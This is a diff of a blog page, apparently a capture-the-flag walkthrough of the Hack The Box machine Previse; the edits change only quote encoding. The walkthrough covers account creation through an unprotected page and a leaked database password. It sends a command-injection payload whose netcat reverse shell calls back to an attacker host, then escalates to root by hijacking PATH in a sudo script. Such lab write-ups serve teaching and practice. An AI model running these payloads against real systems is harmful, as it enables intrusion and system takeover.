@@ -206,7 +206,7 @@ see the <a href="#tldr">TL;DR</a> section at the very end.</p>
 <h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>We can add the IP address for the machine in an <code>/etc/hosts</code> entry for convenience&rsquo;s sake. This will
 do the trick</p>
-<pre tabindex="0"><code>sudo echo '10.10.11.104 previse.htb' &gt;&gt; /etc/hosts
+<pre tabindex="0"><code>sudo echo &#39;10.10.11.104 previse.htb&#39; &gt;&gt; /etc/hosts
 </code></pre><p>Following that, we&rsquo;re going port scan this machine to get an idea of the services running on it.</p>
 <pre tabindex="0"><code>$ sudo nmap -sS -Pn -T4 -A -p- previse.htb
 
@@ -257,7 +257,7 @@ will be found through a flaw in the hosted web page. Let&rsquo;s start enumerati
 <h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>First things first, we will enumerate using <code>gobuster</code> and see if we can find something
 interesting hosted on the HTTP server.</p>
-<pre tabindex="0"><code>$ gobuster dir -u &quot;http://previse.htb/&quot; -w ../../tools/http-enum/common.txt
+<pre tabindex="0"><code>$ gobuster dir -u &#34;http://previse.htb/&#34; -w ../../tools/http-enum/common.txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -308,32 +308,32 @@ looks like without it redirecting our browser to the <code>login.php</code> endp
 
 ...
 
-&lt;nav class=&quot;uk-navbar-container&quot; uk-navbar&gt;
-    &lt;div class=&quot;uk-navbar-center&quot;&gt;
-        &lt;ul class=&quot;uk-navbar-nav&quot;&gt;
-            &lt;li class=&quot;uk-active&quot;&gt;&lt;a href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;nav class=&#34;uk-navbar-container&#34; uk-navbar&gt;
+    &lt;div class=&#34;uk-navbar-center&#34;&gt;
+        &lt;ul class=&#34;uk-navbar-nav&#34;&gt;
+            &lt;li class=&#34;uk-active&#34;&gt;&lt;a href=&#34;/index.php&#34;&gt;Home&lt;/a&gt;&lt;/li&gt;
             &lt;li&gt;
-                &lt;a href=&quot;accounts.php&quot;&gt;ACCOUNTS&lt;/a&gt;
-                &lt;div class=&quot;uk-navbar-dropdown&quot;&gt;
-                    &lt;ul class=&quot;uk-nav uk-navbar-dropdown-nav&quot;&gt;
-                        &lt;li&gt;&lt;a href=&quot;accounts.php&quot;&gt;CREATE ACCOUNT&lt;/a&gt;&lt;/li&gt;
+                &lt;a href=&#34;accounts.php&#34;&gt;ACCOUNTS&lt;/a&gt;
+                &lt;div class=&#34;uk-navbar-dropdown&#34;&gt;
+                    &lt;ul class=&#34;uk-nav uk-navbar-dropdown-nav&#34;&gt;
+                        &lt;li&gt;&lt;a href=&#34;accounts.php&#34;&gt;CREATE ACCOUNT&lt;/a&gt;&lt;/li&gt;
                     &lt;/ul&gt;
                 &lt;/div&gt;
             &lt;/li&gt;
-            &lt;li&gt;&lt;a href=&quot;files.php&quot;&gt;FILES&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&#34;files.php&#34;&gt;FILES&lt;/a&gt;&lt;/li&gt;
             &lt;li&gt;
-                &lt;a href=&quot;status.php&quot;&gt;MANAGEMENT MENU&lt;/a&gt;
-                &lt;div class=&quot;uk-navbar-dropdown&quot;&gt;
-                    &lt;ul class=&quot;uk-nav uk-navbar-dropdown-nav&quot;&gt;
-                        &lt;li&gt;&lt;a href=&quot;status.php&quot;&gt;WEBSITE STATUS&lt;/a&gt;&lt;/li&gt;
-                        &lt;li&gt;&lt;a href=&quot;file_logs.php&quot;&gt;LOG DATA&lt;/a&gt;&lt;/li&gt;
+                &lt;a href=&#34;status.php&#34;&gt;MANAGEMENT MENU&lt;/a&gt;
+                &lt;div class=&#34;uk-navbar-dropdown&#34;&gt;
+                    &lt;ul class=&#34;uk-nav uk-navbar-dropdown-nav&#34;&gt;
+                        &lt;li&gt;&lt;a href=&#34;status.php&#34;&gt;WEBSITE STATUS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&#34;file_logs.php&#34;&gt;LOG DATA&lt;/a&gt;&lt;/li&gt;
                     &lt;/ul&gt;
                 &lt;/div&gt;
             &lt;/li&gt;
-            &lt;li&gt;&lt;a href=&quot;#&quot; class=&quot;.uk-text-uppercase&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a href=&#34;#&#34; class=&#34;.uk-text-uppercase&#34;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
             &lt;li&gt;
-                &lt;a href=&quot;logout.php&quot;&gt;
-                    &lt;button class=&quot;uk-button uk-button-default uk-button-small&quot;&gt;LOG OUT&lt;/button&gt;
+                &lt;a href=&#34;logout.php&#34;&gt;
+                    &lt;button class=&#34;uk-button uk-button-default uk-button-small&#34;&gt;LOG OUT&lt;/button&gt;
                 &lt;/a&gt;
             &lt;/li&gt;
         &lt;/ul&gt;
@@ -341,7 +341,6 @@ looks like without it redirecting our browser to the <code>login.php</code> endp
 &lt;/nav&gt;
 
 ...
-
 </code></pre><p>Well, well, well. What&rsquo;s this? This page seems different to <code>login.php</code>, and it just gave us some
 information about other pages hosted on the server: <code>accounts.php</code>, <code>files.php</code>, <code>status.php</code>,
 <code>file_logs.php</code>, and <code>login.php</code>.</p>
@@ -349,33 +348,33 @@ information about other pages hosted on the server: <code>accounts.php</code>, <
 appears this page can be used to create user accounts through a <code>POST</code> request.</p>
 <pre tabindex="0"><code>...
 
-&lt;section class=&quot;uk-section uk-section-default&quot;&gt;
-    &lt;div class=&quot;uk-container&quot;&gt;
-        &lt;h2 class=&quot;uk-heading-divider&quot;&gt;Add New Account&lt;/h2&gt;
+&lt;section class=&#34;uk-section uk-section-default&#34;&gt;
+    &lt;div class=&#34;uk-container&#34;&gt;
+        &lt;h2 class=&#34;uk-heading-divider&#34;&gt;Add New Account&lt;/h2&gt;
         &lt;p&gt;Create new user.&lt;/p&gt;
-        &lt;p class=&quot;uk-alert-danger&quot;&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/p&gt;
+        &lt;p class=&#34;uk-alert-danger&#34;&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/p&gt;
         &lt;p&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/p&gt;
     &lt;/p&gt;
-        &lt;form role=&quot;form&quot; method=&quot;post&quot; action=&quot;accounts.php&quot;&gt;
-            &lt;div class=&quot;uk-margin&quot;&gt;
-                &lt;div class=&quot;uk-inline&quot;&gt;
-                    &lt;span class=&quot;uk-form-icon&quot; uk-icon=&quot;icon: user&quot;&gt;&lt;/span&gt;
-                    &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;uk-input&quot; id=&quot;username&quot; placeholder=&quot;Username&quot;&gt;
+        &lt;form role=&#34;form&#34; method=&#34;post&#34; action=&#34;accounts.php&#34;&gt;
+            &lt;div class=&#34;uk-margin&#34;&gt;
+                &lt;div class=&#34;uk-inline&#34;&gt;
+                    &lt;span class=&#34;uk-form-icon&#34; uk-icon=&#34;icon: user&#34;&gt;&lt;/span&gt;
+                    &lt;input type=&#34;text&#34; name=&#34;username&#34; class=&#34;uk-input&#34; id=&#34;username&#34; placeholder=&#34;Username&#34;&gt;
                 &lt;/div&gt;
             &lt;/div&gt;
-            &lt;div class=&quot;uk-margin&quot;&gt;
-                &lt;div class=&quot;uk-inline&quot;&gt;
-                    &lt;span class=&quot;uk-form-icon&quot; uk-icon=&quot;icon: lock&quot;&gt;&lt;/span&gt;
-                    &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;uk-input&quot; id=&quot;password&quot; placeholder=&quot;Password&quot;&gt;
+            &lt;div class=&#34;uk-margin&#34;&gt;
+                &lt;div class=&#34;uk-inline&#34;&gt;
+                    &lt;span class=&#34;uk-form-icon&#34; uk-icon=&#34;icon: lock&#34;&gt;&lt;/span&gt;
+                    &lt;input type=&#34;password&#34; name=&#34;password&#34; class=&#34;uk-input&#34; id=&#34;password&#34; placeholder=&#34;Password&#34;&gt;
                 &lt;/div&gt;
             &lt;/div&gt;
-            &lt;div class=&quot;uk-margin&quot;&gt;
-                &lt;div class=&quot;uk-inline&quot;&gt;
-                    &lt;span class=&quot;uk-form-icon&quot; uk-icon=&quot;icon: lock&quot;&gt;&lt;/span&gt;
-                    &lt;input type=&quot;password&quot; name=&quot;confirm&quot; class=&quot;uk-input&quot; id=&quot;confirm&quot; placeholder=&quot;Confirm Password&quot;&gt;
+            &lt;div class=&#34;uk-margin&#34;&gt;
+                &lt;div class=&#34;uk-inline&#34;&gt;
+                    &lt;span class=&#34;uk-form-icon&#34; uk-icon=&#34;icon: lock&#34;&gt;&lt;/span&gt;
+                    &lt;input type=&#34;password&#34; name=&#34;confirm&#34; class=&#34;uk-input&#34; id=&#34;confirm&#34; placeholder=&#34;Confirm Password&#34;&gt;
                 &lt;/div&gt;
             &lt;/div&gt;
-            &lt;button type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;uk-button uk-button-default&quot;&gt;CREATE USER&lt;/button&gt;
+            &lt;button type=&#34;submit&#34; name=&#34;submit&#34; class=&#34;uk-button uk-button-default&#34;&gt;CREATE USER&lt;/button&gt;
         &lt;/form&gt;
     &lt;/div&gt;
 &lt;/section&gt;
@@ -383,7 +382,7 @@ appears this page can be used to create user accounts through a <code>POST</code
 </code></pre><p>Bonus points, we have the minimal rules for usernames and passwords. Breaking this down, the
 <code>accounts.php</code> endpoint takes a <code>POST</code> request with <code>username</code>, <code>password</code>, and <code>confirm</code> parameters
 as input to create new user accounts. Using <code>curl</code>, this looks like this:</p>
-<pre tabindex="0"><code>$ curl -XPOST 'http://previse.htb/accounts.php' --data-raw 'username=redbay&amp;password=redbay&amp;confirm=redbay'
+<pre tabindex="0"><code>$ curl -XPOST &#39;http://previse.htb/accounts.php&#39; --data-raw &#39;username=redbay&amp;password=redbay&amp;confirm=redbay&#39;
 </code></pre><p>We can go validate that it worked by browsing to the <code>login.php</code> and trying the new credentials.</p>
 <p><img src="/img/htb-previse/logged-in.png" alt=""></p>
 <p>Great! This confirms we&rsquo;re logged in! We now have some poking around to do. These things actually
@@ -410,10 +409,10 @@ foothold on <code>Previse</code>.</p>
 &lt;?php
 
 function connectDB(){
-    $host = 'localhost';
-    $user = 'root';
-    $passwd = 'mySQL_p@ssw0rd!:)';
-    $db = 'previse';
+    $host = &#39;localhost&#39;;
+    $user = &#39;root&#39;;
+    $passwd = &#39;mySQL_p@ssw0rd!:)&#39;;
+    $db = &#39;previse&#39;;
     $mycon = new mysqli($host, $user, $passwd, $db);
     return $mycon;
 }
@@ -423,15 +422,15 @@ function connectDB(){
 of interest.</p>
 <pre tabindex="0"><code>  1 &lt;?php
   2 session_start();
-  3 if (!isset($_SESSION['user'])) {
-  4     header('Location: login.php');
+  3 if (!isset($_SESSION[&#39;user&#39;])) {
+  4     header(&#39;Location: login.php&#39;);
   5     exit;
   6 }
   7 ?&gt;
   8
   9 &lt;?php
- 10 if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
- 11     header('Location: login.php');
+ 10 if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {
+ 11     header(&#39;Location: login.php&#39;);
  12     exit;
  13 }
  14
@@ -439,7 +438,7 @@ of interest.</p>
  16 //i tried really hard to parse the log delims in php, but python was so much easier//
  17 /////////////////////////////////////////////////////////////////////////////////////
  18
- 19 $output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_post['delim']}&quot;);
+ 19 $output = exec(&#34;/usr/bin/python /opt/scripts/log_process.py {$_post[&#39;delim&#39;]}&#34;);
  20 echo $output;
  
 </code></pre><p>Looking at the above code, we can observe that the <code>delim</code> <code>POST</code> request input parameter isn&rsquo;t
@@ -448,12 +447,11 @@ Obviously this isn&rsquo;t what the developer intended but it is what we&rsquo;r
 insert an arbitrary command following the <code>log_process.py</code> command invocation by using a
 semi-column. Let&rsquo;s fire up a reverse shell using <code>netcat</code> and see what we get out of it.</p>
 <p>For this operation, we need to make sure we&rsquo;re logged in.</p>
-<pre tabindex="0"><code>$ curl -XPOST -c - 'http://previse.htb/login.php' --data-raw 'username=redbay&amp;password=redbay'
+<pre tabindex="0"><code>$ curl -XPOST -c - &#39;http://previse.htb/login.php&#39; --data-raw &#39;username=redbay&amp;password=redbay&#39;
 
 ...
 
 previse.htb     FALSE   /       FALSE   0       PHPSESSID       jg7bi95its9ketrfm5j2ht21q5
-
 </code></pre><p>The <code>-c</code> flag is for <code>curl</code> to output the returned cookie. This is necessary because the <code>logs.php</code>
 source code is expecting the user to be logged in for this operation to work. We need to pass the
 <code>PHPSESSID</code> along with our payload to the <code>logs.php</code> <code>POST</code> request.</p>
@@ -461,8 +459,7 @@ source code is expecting the user to be logged in for this operation to work. We
 <code>4445</code>.</p>
 <pre tabindex="0"><code>nc -lvnp 4445
 </code></pre><p>Then, we can send our payload to the <code>Previse</code> machine.</p>
-<pre tabindex="0"><code>$ curl -XPOST 'http://previse.htb/logs.php' -H 'Cookie: PHPSESSID=jg7bi95its9ketrfm5j2ht21q5' --data-raw 'delim=space; nc &lt;attack ip&gt; 4445 -e /bin/bash'
-
+<pre tabindex="0"><code>$ curl -XPOST &#39;http://previse.htb/logs.php&#39; -H &#39;Cookie: PHPSESSID=jg7bi95its9ketrfm5j2ht21q5&#39; --data-raw &#39;delim=space; nc &lt;attack ip&gt; 4445 -e /bin/bash&#39;
 </code></pre><p>And BINGO! <code>Previse</code> connected back to our machine. We now have a reverse shell</p>
 <pre tabindex="0"><code>Connection from 10.10.11.104:49712
 whoami
@@ -475,10 +472,10 @@ to connect to a database so that will be next on our to do list.</p>
 <h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Huge take away from the <code>config.php</code> file is the <code>$mycon = new mysql...</code> line. It hints at a <code>mysql</code>
 database. Before we proceed, we will want to &ldquo;upgrade&rdquo; our shell to a fully interactive TTY shell.</p>
-<pre tabindex="0"><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+<pre tabindex="0"><code>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
 </code></pre><p>Once that&rsquo;s done, we can try to connect to the database. We&rsquo;re not guessing here, we&rsquo;re actually
 just using the information gleaned from the configuration file.</p>
-<pre tabindex="0"><code>mysql -h localhost -u root --password='mySQL_p@ssw0rd!:)' --database=previse
+<pre tabindex="0"><code>mysql -h localhost -u root --password=&#39;mySQL_p@ssw0rd!:)&#39; --database=previse
 
 mysql: [Warning] Using a password on the command line interface can be insecure.
 Reading table information for completion of table and column names
@@ -494,11 +491,11 @@ Oracle is a registered trademark of Oracle Corporation and/or its
 affiliates. Other names may be trademarks of their respective
 owners.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
 
 mysql&gt;
 </code></pre><p>You can list the databases using the following SQL query</p>
-<pre tabindex="0"><code>mysql&gt; select table_name, column_name from information_schema.columns where table_schema = 'previse';
+<pre tabindex="0"><code>mysql&gt; select table_name, column_name from information_schema.columns where table_schema = &#39;previse&#39;;
 +------------+-------------+
 | table_name | column_name |
 +------------+-------------+
@@ -569,7 +566,7 @@ there, we would have needed a larger word list or we would have had to use a
 would have been a lot more time consuming.</p>
 <p>In any case, we have a password. Let&rsquo;s give it a spin through SSH.</p>
 <pre tabindex="0"><code>$ ssh m4lwhere@10.10.11.104
-m4lwhere@10.10.11.104's password:
+m4lwhere@10.10.11.104&#39;s password:
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -618,10 +615,10 @@ similar to what we saw in <code>logs.php</code> that we can exploit.</p>
 # We always make sure to store logs, we take security SERIOUSLY here
 
 # I know I shouldnt run this as root but I cant figure it out programmatically on my account
-# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time
+# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time
 
-gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
-gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&#34;yesterday&#34; +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&#34;yesterday&#34; +%Y%b%d)_file_access.gz
 </code></pre><p>Well, this is good news for us. The mistake here is that the developer didn&rsquo;t use absolute paths to
 reference executables. The shell will go through every entries of the <code>PATH</code>
 environement variable until it finds the command to execute. This means that if we have a command
@@ -634,7 +631,7 @@ is to simply invoke <code>bash</code> from our executable file. We will need to 
 variable to make sure the script picks up our version of <code>gzip</code> and not the intended one found in
 <code>/bin/gzip</code>.</p>
 <p>Now that we kind of know the steps to do, let&rsquo;s give it a shot</p>
-<pre tabindex="0"><code>m4lwhere@previse:~$ echo &quot;/bin/bash 1&gt;&amp;2&quot; &gt; ./gzip
+<pre tabindex="0"><code>m4lwhere@previse:~$ echo &#34;/bin/bash 1&gt;&amp;2&#34; &gt; ./gzip
 m4lwhere@previse:~$ chmod 755 ./gzip
 m4lwhere@previse:~$ export PATH=./:$PATH
 m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
@@ -649,7 +646,7 @@ this. Omitting that redirect will give us a <code>root</code> shell but it will 
 the output of any command unless it&rsquo;s redirected to <code>stderr</code>.</p>
 <p>Here&rsquo;s an example of what it would have looked like had we not put the redirect in our <code>./gzip</code>
 file (assuming <code>755</code> permissions and the <code>PATH</code> are already set).</p>
-<pre tabindex="0"><code>m4lwhere@previse:~$ echo &quot;/bin/bash&quot; &gt; ./gzip
+<pre tabindex="0"><code>m4lwhere@previse:~$ echo &#34;/bin/bash&#34; &gt; ./gzip
 m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
 root@previse:~# ls -la
 root@previse:~# cat /root/root.txt
